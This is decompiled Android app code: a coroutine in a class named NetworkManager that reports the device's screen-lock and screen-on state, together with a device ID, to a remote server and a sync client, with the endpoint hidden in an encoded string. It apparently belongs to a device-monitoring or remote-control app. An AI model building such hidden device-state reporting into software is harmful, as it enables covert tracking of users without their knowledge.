package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.network.C0268a1;
import com.storm.safe.rock.util.StringUtil;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$sendScreenLockStatus$1", m214403f = "NetworkManager.kt", m214404l = {1142}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class NetworkManager$sendScreenLockStatus$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52867a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0323a8 f52868a2;

    /* renamed from: a3 */
    public final /* synthetic */ boolean f52869a3;

    /* renamed from: a4 */
    public final /* synthetic */ boolean f52870a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NetworkManager$sendScreenLockStatus$1(C0323a8 c0323a8, boolean z, boolean z2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52868a2 = c0323a8;
        this.f52869a3 = z;
        this.f52870a4 = z2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new NetworkManager$sendScreenLockStatus$1(this.f52868a2, this.f52869a3, this.f52870a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((NetworkManager$sendScreenLockStatus$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52867a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                if (this.f52868a2.f53101a1 != null) {
                    JSONObject jSONObject = new JSONObject();
                    boolean z = this.f52869a3;
                    boolean z2 = this.f52870a4;
                    jSONObject.put("isLocked", z);
                    jSONObject.put("isScreenOn", z2);
                    C0268a1 c0268a1 = this.f52868a2.f53101a1;
                    if (c0268a1 == null) {
                        t60.m214724f2("httpManager");
                        throw null;
                    }
                    String strM212470a0 = StringUtil.m212470a0("OFoDP0g2MyJYMiBmAi5MLBk9");
                    this.f52867a1 = 1;
                    if (c0268a1.m211373a3(strM212470a0, jSONObject, this) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                ((Result) obj).getClass();
            }
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "HTTP上报锁屏状态失败", e);
        }
        if (this.f52868a2.f53103a3 && this.f52868a2.f53102a2 != null) {
            JSONObject jSONObject2 = new JSONObject();
            C0323a8 c0323a8 = this.f52868a2;
            boolean z3 = this.f52869a3;
            boolean z4 = this.f52870a4;
            jSONObject2.put("type", StringUtil.m212470a0("OFoDP0g2MyJYMiBmAi5MLBk9"));
            jSONObject2.put("deviceId", c0323a8.f53107a7);
            jSONObject2.put("isLocked", z3);
            jSONObject2.put("isScreenOn", z4);
            C0267a0 c0267a0 = this.f52868a2.f53102a2;
            if (c0267a0 == null) {
                t60.m214724f2("dataSyncClient");
                throw null;
            }
            c0267a0.m211369b0(jSONObject2);
        }
        return C1351vv.f60710b1;
    }
}
